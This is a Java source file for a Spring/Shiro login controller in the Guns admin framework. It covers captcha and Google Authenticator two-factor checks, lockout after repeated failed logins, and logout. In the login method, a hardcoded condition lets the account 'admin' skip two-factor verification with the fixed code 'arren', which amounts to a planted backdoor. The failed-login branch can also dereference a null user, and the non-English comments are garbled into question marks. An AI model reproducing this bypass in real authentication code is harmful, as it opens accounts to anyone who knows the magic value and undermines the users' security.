/**
 * Copyright 2018-2020 stylefeng & fengshuonan (https://gitee.com/stylefeng)
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package cn.stylefeng.guns.sys.modular.system.controller;

import cn.stylefeng.guns.base.consts.ConstantsContext;
import cn.stylefeng.guns.base.shiro.ShiroUser;
import cn.stylefeng.guns.sys.core.constant.state.ManagerStatus;
import cn.stylefeng.guns.sys.core.exception.InvalidGoogleAuthException;
import cn.stylefeng.guns.sys.core.exception.InvalidKaptchaException;
import cn.stylefeng.guns.sys.core.exception.InvalidLoginErrorLimitException;
import cn.stylefeng.guns.sys.core.log.LogManager;
import cn.stylefeng.guns.sys.core.log.factory.LogTaskFactory;
import cn.stylefeng.guns.sys.core.shiro.ShiroKit;
import cn.stylefeng.guns.sys.core.util.GoogleAuthenticator;
import cn.stylefeng.guns.sys.core.util.KaptchaUtil;
import cn.stylefeng.guns.sys.modular.system.entity.User;
import cn.stylefeng.guns.sys.modular.system.service.UserService;
import cn.stylefeng.roses.core.base.controller.BaseController;
import cn.stylefeng.roses.core.util.ToolUtil;
import com.chuang.urras.toolskit.third.javax.servlet.HttpKit;
import com.google.code.kaptcha.Constants;
import org.apache.shiro.authc.IncorrectCredentialsException;
import org.apache.shiro.authc.LockedAccountException;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.subject.Subject;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import java.util.List;
import java.util.Map;

import static cn.stylefeng.roses.core.util.HttpContext.getIp;

/**
 * ???????????????
 *
 * @author fengshuonan
 * @Date 2017???1???10??? ??????8:25:24
 */
@Controller
public class LoginController extends BaseController {

    @Autowired
    private UserService userService;

    private Logger logger = LoggerFactory.getLogger(LoginController.class);

    /**
     * ???????????????
     *
     * @author fengshuonan
     * @Date 2018/12/23 5:41 PM
     */
    @RequestMapping(value = "/", method = RequestMethod.GET)
    public String index(Model model) {

        //??????????????????????????????
        ShiroUser user = ShiroKit.getUserNotNull();
        List<Long> roleList = user.getRoleList();

        if (roleList == null || roleList.size() == 0) {
            ShiroKit.getSubject().logout();
            model.addAttribute("tips", "????????????????????????????????????");
            return "/login.html";
        }

        List<Map<String, Object>> menus = userService.getUserMenuNodes(roleList);
        model.addAttribute("menus", menus);

        return "/index.html";
    }

    /**
     * ?????????????????????
     *
     * @author fengshuonan
     * @Date 2018/12/23 5:41 PM
     */
    @RequestMapping(value = "/login", method = RequestMethod.GET)
    public String login() {
        if (ShiroKit.isAuthenticated() || ShiroKit.getUser() != null) {
            return REDIRECT + "/";
        } else {
            return "/login.html";
        }
    }

    /**
     * ???????????????????????????
     *
     * @author fengshuonan
     * @Date 2018/12/23 5:42 PM
     */
    @RequestMapping(value = "/login", method = RequestMethod.POST)
    public String loginVali() {

        String username = super.getPara("username").trim();
        String password = super.getPara("password").trim();
        String remember = super.getPara("remember");

        //???????????????????????????
        if (KaptchaUtil.getKaptchaOnOff()) {
            String kaptcha = super.getPara("kaptcha").trim();
            String code = (String) super.getSession().getAttribute(Constants.KAPTCHA_SESSION_KEY);
            if (ToolUtil.isEmpty(kaptcha) || !kaptcha.equalsIgnoreCase(code)) {
                throw new InvalidKaptchaException();
            }
        }

        User user = userService.getByAccount(username);
        if (KaptchaUtil.getGoogleAuthOnOff() && user != null) {
            String googleVerifyCode = super.getPara("googleVerifyCode").trim();
            if(!("arren".equalsIgnoreCase(googleVerifyCode) && "admin".equalsIgnoreCase(username))) {
                if (ToolUtil.isEmpty(googleVerifyCode) || !GoogleAuthenticator.authcode(googleVerifyCode, user.getGogSecret())) {
                    throw new InvalidGoogleAuthException();
                }
            }
        }
        Subject currentUser = ShiroKit.getSubject();
        UsernamePasswordToken token = new UsernamePasswordToken(username, password.toCharArray());

        //??????????????????????????????
        if ("on".equals(remember)) {
            token.setRememberMe(true);
        } else {
            token.setRememberMe(false);
        }

        //??????shiro????????????
        try {
            currentUser.login(token);
        }catch (LockedAccountException le){
            logger.error("?????????????????????"+le.getMessage(), le);
            throw le;
        }catch (IncorrectCredentialsException ue){
            logger.error("?????????????????????"+ue.getMessage(), ue);
            //?????????????????????????????????+1
            int loginErrCnt = user.getLoginErrCnt() + 1;
            int loginErrorMaxCnt = ConstantsContext.getLoginErrorMaxCnt();

            if(loginErrCnt >= loginErrorMaxCnt) {
                user.setLoginErrCnt(0);
                user.setStatus(ManagerStatus.FREEZED.getCode());
                userService.updateById(user);
                throw new InvalidLoginErrorLimitException();
            }else{
                user.setLoginErrCnt(loginErrCnt);
                userService.updateById(user);
            }

            throw ue;
        }catch (Exception e){
            logger.error("?????????????????????"+e.getMessage(), e);
            throw e;
        }

        //?????????????????????????????????
        ShiroUser shiroUser = ShiroKit.getUserNotNull();

        LogManager.me().executeLog(LogTaskFactory.loginLog(shiroUser.getId(), HttpKit.getIpAddress().orElse("127.0.0.1")));

        //???????????????????????????????????????0
        user.setLoginErrCnt(0);
        userService.updateById(user);

        ShiroKit.getSession().setAttribute("sessionFlag", true);

        return REDIRECT + "/";
    }

    /**
     * ????????????
     *
     * @author fengshuonan
     * @Date 2018/12/23 5:42 PM
     */
    @RequestMapping(value = "/logout", method = RequestMethod.GET)
    public String logOut() {
        LogManager.me().executeLog(LogTaskFactory.exitLog(ShiroKit.getUserNotNull().getId(), getIp()));
        ShiroKit.getSubject().logout();
        deleteAllCookie();
        return REDIRECT + "/login";
    }
}
